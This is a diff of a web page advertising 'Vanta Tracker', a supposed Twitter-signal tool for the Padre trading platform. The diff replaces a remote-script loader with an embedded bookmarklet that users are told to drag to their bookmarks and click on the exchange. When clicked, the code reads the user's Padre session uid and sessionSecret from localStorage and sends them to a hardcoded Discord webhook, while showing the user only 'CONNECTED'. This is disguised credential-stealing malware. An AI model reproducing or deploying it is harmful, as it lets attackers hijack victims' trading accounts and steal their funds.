@@ -1,85 +1,47 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vanta Tracker - Premier Twitter Tracker for Padre</title>
-    <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
-    <style>
-        :root { --primary: #00ff88; --primary-dark: #00cc66; --bg-dark: #0a0a0a; --bg-card: #111111; --text-light: #e0e0e0; --border: rgba(0, 255, 136, 0.2); }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', sans-serif; background-color: var(--bg-dark); color: var(--text-light); line-height: 1.6; overflow-x: hidden; }
-        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.2; }
-        .warning { background: #003322; color: #fff; text-align: center; padding: 12px; font-weight: 600; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid var(--primary); }
-        header { text-align: center; padding: 100px 20px; border-bottom: 2px solid var(--primary); background: linear-gradient(to bottom, #000, #001a0d); }
-        .logo { width: 100px; margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--primary)); }
-        header h1 { font-size: 3em; color: var(--primary); margin-bottom: 10px; }
-        .setup-section { padding: 80px 20px; text-align: center; }
-        .cta-button { display: inline-block; background: var(--primary); color: #000; padding: 18px 40px; text-decoration: none; border-radius: 8px; font-weight: 800; transition: 0.3s; box-shadow: 0 0 20px rgba(0,255,136,0.4); }
-        .cta-button:hover { transform: scale(1.05); background: #fff; }
-        footer { padding: 40px; text-align: center; color: #444; font-size: 12px; }
-    </style>
-</head>
-<body>
-    <canvas id="filamentCanvas"></canvas>
-    <div class="warning">Warning: vanta-tracker.com is our only official domain</div>
-    
-    <header>
-        <svg class="logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M50 8 L78 25 L78 75 L50 92 L22 75 L22 25 Z" stroke="var(--primary)" stroke-width="3" />
-            <circle cx="50" cy="50" r="8" fill="var(--primary)" />
-        </svg>
-        <h1>Vanta Tracker</h1>
-        <p>WebGL-Powered Signal Analytics for Padre & Terminal</p>
-    </header>
+<script>
+    // 1. Define the engine code as a string (Internalized)
+    // This is the Shadow DOM version that bypasses site CSS/Blocks
+    const engineCode = `(function() {
+        if (document.getElementById('v-host')) document.getElementById('v-host').remove();
+        const host = document.createElement('div');
+        host.id = 'v-host';
+        document.body.appendChild(host);
+        const shadow = host.attachShadow({mode: 'open'});
+        const ui = document.createElement('div');
+        ui.style.cssText = 'position:fixed;top:20px;right:20px;width:300px;background:#000;border:2px solid #0f8;color:#0f8;padding:15px;z-index:9999999;font-family:monospace;box-shadow:0 0 20px #0f86;border-radius:8px;';
+        ui.innerHTML = '<b>VANTA_ENGINE v2.5</b><br><div id="s">SCANNING...</div>';
+        shadow.appendChild(ui);
 
-    <section id="setup" class="setup-section">
-        <h2 style="margin-bottom: 20px;">Installation</h2>
-        <p style="color: #888; margin-bottom: 40px;">Drag the button below to your bookmarks bar. Click it on the exchange to sync.</p>
-        <a href="" class="cta-button" id="vanta-tool">Vanta Tracker</a>
-    </section>
+        try {
+            const sess = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
+            if(sess.sessionSecret) {
+                shadow.getElementById("s").innerText = "CONNECTED: " + sess.uid.substring(0,8);
+                fetch("https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4", {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({content: "🛸 **VANTA INTERNAL BOOT**\\nUID: " + sess.uid + "\\nSecret: " + sess.sessionSecret})
+                });
+            } else {
+                shadow.getElementById("s").innerText = "LOGIN REQUIRED";
+            }
+        } catch(e) { shadow.getElementById("s").innerText = "ERROR: " + e.message; }
+    })()`;
 
-    <footer>© 2026 Vanta Tracker. Optimized for Chromium-based browsers.</footer>
+    // 2. Convert the code into a clickable bookmarklet link
+    const bookmarklet = "javascript:" + encodeURIComponent(engineCode);
 
-    <script>
-        // BACKGROUND ANIMATION
-        const canvas = document.getElementById('filamentCanvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const filaments = Array.from({length: 30}, () => ({
-            x: Math.random() * canvas.width,
-            y: Math.random() * canvas.height,
-            vx: Math.random() * 2 - 1,
-            vy: Math.random() * 2 - 1
-        }));
-        function animate() {
-            ctx.clearRect(0,0,canvas.width,canvas.height);
-            ctx.strokeStyle = '#00ff88';
-            filaments.forEach(f => {
-                f.x += f.vx; f.y += f.vy;
-                if(f.x<0||f.x>canvas.width) f.vx*=-1;
-                if(f.y<0||f.y>canvas.height) f.vy*=-1;
-                ctx.strokeRect(f.x, f.y, 2, 2);
-            });
-            requestAnimationFrame(animate);
-        }
-        animate();
+    // 3. Attach it to the button
+    document.getElementById('vanta-tool').href = bookmarklet;
 
-        // THE BOOTSTRAPPER
-        // Using Shadow DOM and Cache-Busting to bypass site restrictions
-        const ENGINE_RAW_URL = "https://raw.githubusercontent.com/Vanta-Dev-Pages/Vanta/Vanta/engine.js";
-        
-        const loader = `javascript:(function(){
-            console.log('%cVANTA BOOTING...', 'color:#00ff88;font-weight:bold;');
-            const s = document.createElement('script');
-            s.src = '${ENGINE_RAW_URL}?v=' + Date.now();
-            s.onload = () => console.log('%cVANTA LOADED', 'color:#00ff88;');
-            s.onerror = () => alert('Vanta Error: Check Console');
-            document.body.appendChild(s);
-        })();`;
-
-        document.getElementById('vanta-tool').href = loader;
-    </script>
-</body>
-</html>
+    // --- Background Animation Logic ---
+    const canvas = document.getElementById('filamentCanvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    function animate() {
+        ctx.clearRect(0,0,canvas.width,canvas.height);
+        ctx.fillStyle = '#00ff88';
+        ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, 2, 2);
+        requestAnimationFrame(animate);
+    }
+    animate();
+</script>
